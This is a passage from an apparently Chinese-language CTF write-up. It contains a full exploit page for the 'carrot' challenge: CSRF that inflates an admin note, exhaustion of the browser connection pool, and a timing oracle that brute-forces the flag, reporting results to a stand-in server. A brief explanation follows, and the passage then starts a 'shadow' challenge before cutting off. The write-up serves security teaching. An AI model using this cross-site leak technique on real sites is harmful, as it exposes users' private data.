	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">

<span class="token comment">// this is send is used as logging</span>
<span class="token constant">LOG</span> <span class="token operator">=</span> <span class="token string">'Starting'</span>
<span class="token comment">// 255 in normal chrome, 99 in headless</span>
<span class="token constant">SOCKETLIMIT</span> <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
<span class="token comment">// default</span>
<span class="token constant">TIMELIMIT</span> <span class="token operator">=</span> <span class="token number">800</span><span class="token punctuation">;</span>
<span class="token constant">INSTANCE</span> <span class="token operator">=</span> <span class="token string">''</span>
<span class="token constant">MYSERVER</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">example.com</span><span class="token template-punctuation string">`</span></span>

<span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">time_fetch</span> <span class="token operator">=</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> test_server_url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">MYSERVER</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">LOG</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> start <span class="token operator">=</span> window<span class="token punctuation">.</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>test_server_url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> end <span class="token operator">=</span> window<span class="token punctuation">.</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> end <span class="token operator">-</span> start<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">fetch_sleep_long</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 40s sleep</span>
    <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>i<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">MYSERVER</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/40sleep</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">fetch_sleep_short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 0.25s sleep</span>
    <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>i<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">MYSERVER</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/ssleep</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">block_socket</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">fetch_sleep_long</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// needed?</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">exhaust_sockets</span> <span class="token operator">=</span> <span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">SOCKETLIMIT</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">block_socket</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Used </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>i<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> connections</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">timeit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> popup</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>

        popup<span class="token punctuation">.</span>location <span class="token operator">=</span> url<span class="token punctuation">;</span>
        <span class="token comment">// needed?</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>

        <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">time_fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token function">r</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// const alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-&#125;!"#$%&amp;\'()*+,-./:;&lt;=>?@[\\]^`|~&#123;'.split('');</span>
<span class="token keyword">const</span> alphabet <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz&#125;_'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// const alphabet = 'abcdef&#125;'.split('');</span>

<span class="token keyword">const</span> <span class="token function-variable function">oracle</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">search</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://carrot-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">INSTANCE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.mc.ax/tasks?search=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>search<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
    <span class="token keyword">let</span> t <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">timeit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token constant">WINBG</span><span class="token punctuation">)</span>

    <span class="token constant">LOG</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>search<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>search<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> t <span class="token operator">></span> <span class="token constant">TIMELIMIT</span> 
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">brute</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> char <span class="token keyword">of</span> alphabet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">oracle</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> char<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> char<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">calibrate</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// slow</span>
        <span class="token keyword">let</span> url1 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://carrot-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">INSTANCE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.mc.ax/tasks?search=dice&#123;</span><span class="token template-punctuation string">`</span></span>
        <span class="token keyword">let</span> t1 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">timeit</span><span class="token punctuation">(</span>url1<span class="token punctuation">,</span> <span class="token constant">WINBG</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">slow:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token comment">// fast</span>
        <span class="token keyword">let</span> url2 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://carrot-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">INSTANCE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.mc.ax/tasks?search=XXXXXXXXXX</span><span class="token template-punctuation string">`</span></span>
        <span class="token keyword">let</span> t2 <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">timeit</span><span class="token punctuation">(</span>url2<span class="token punctuation">,</span> <span class="token constant">WINBG</span><span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">fast:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>t2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">r</span><span class="token punctuation">(</span><span class="token punctuation">(</span>t1 <span class="token operator">+</span> t2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> exploit <span class="token operator">=</span> <span class="token keyword">async</span><span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Starting'</span><span class="token punctuation">)</span>
    <span class="token comment">// dont go to fast plz :) </span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">waiting 3s</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>
    <span class="token comment">// exaust sockets</span>
    <span class="token keyword">await</span> <span class="token function">exhaust_sockets</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>
    <span class="token constant">LOG</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Calibrating</span><span class="token template-punctuation string">`</span></span>
    <span class="token constant">TIMELIMIT</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">calibrate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token constant">LOG</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">TIMELIMIT:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">TIMELIMIT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">timelimit:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">TIMELIMIT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> last<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        last <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">brute</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>last <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> flag<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> 
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            flag <span class="token operator">+=</span> last<span class="token punctuation">;</span>
            output<span class="token punctuation">.</span>innerText <span class="token operator">=</span> flag<span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>last <span class="token operator">===</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> flag
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">popunder</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>opener<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token constant">WINBG</span> <span class="token operator">=</span> window<span class="token punctuation">.</span>opener
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token constant">WINBG</span> <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">,</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token punctuation">)</span>
        location <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">about:blank</span><span class="token template-punctuation string">`</span></span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">csrf</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    x<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://carrot-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">INSTANCE</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.mc.ax/edit/0</span><span class="token template-punctuation string">`</span></span>
    x<span class="token punctuation">.</span>title<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"A"</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span>
    x<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">no INSTANCE</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>
    <span class="token constant">INSTANCE</span> <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span>
    <span class="token comment">// step 1 </span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'csrf'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// step 2</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">'exploit'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// window open is ok in headless :)</span>
        <span class="token function">popunder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token string">'dice&#123;'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>簡單來說可以先用 CSRF 去改 admin note 的 title，改成一個超級長的字串，因為 jinja2 render 會變慢，所以 response time 就會增加。</p>
<p>再來就是 timing attack 了，上面的 exploit 用的是 <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">connection pool</a>，先把瀏覽器的 connection pool 塞到只剩下一個，這時候就剩下一個 connection 可以用了。</p>
<p>這時候我們用新的 window 去造訪 search 的 URL（稱作 reqSearch 好了），與此同時再發一個 request 到我們自己的 server（我們叫做 reqMeasure），因為只有一個 connection 可以用，所以 reqMeasure 從發出 request 到收到 response 的時間，就是 <code>reqSearch 花的時間 + reqMeasure 花的時間</code>，假設 reqMeasure 花的時間都差不多，那我們很容易可以測量出 reqSearch 花的時間。</p>
<p>可以測量時間之後，就可以慢慢暴力破解出 flag 的內容。</p>
<h2><span id="webx2fshadow0-solves">web&#x2F;shadow(0 solves)</span></h2><p>這題是純前端的題目，我們直接來看程式碼：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>shadow<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>store your secrets here:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vault<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xss<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
      <span class="token comment">// the admin has the flag set in localStorage["secret"]</span>
      <span class="token keyword">let</span> secret <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"secret"</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">"dice&#123;not_real_flag&#125;"</span>
      <span class="token keyword">let</span> shadow <span class="token operator">=</span> window<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">attachShadow</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">"closed"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
